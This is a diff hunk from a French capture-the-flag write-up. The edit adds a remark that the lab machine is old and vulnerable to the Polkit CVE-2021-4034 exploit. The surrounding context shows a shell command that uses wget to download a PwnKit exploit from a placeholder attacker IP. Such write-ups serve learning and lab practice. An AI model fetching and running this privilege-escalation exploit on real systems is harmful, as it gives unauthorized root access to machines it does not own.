@@ -262,7 +262,7 @@ Le flag ce trouve dans **/root/root.txt** comme d'hab :)
 
 # Cheat mode :
 Pour vous dire la vérité, cette room, je l'avais root directement avec le compte www-data :D.
-La VM est vulnérable a l'exploit de Polkit CVE-2021-4034.
+La VM est vulnérable a l'exploit de Polkit CVE-2021-4034. Cette VM est bien plus vielle !
 
 ```
 www-data@sky:/tmp$ wget {MON IP}/PwnKit
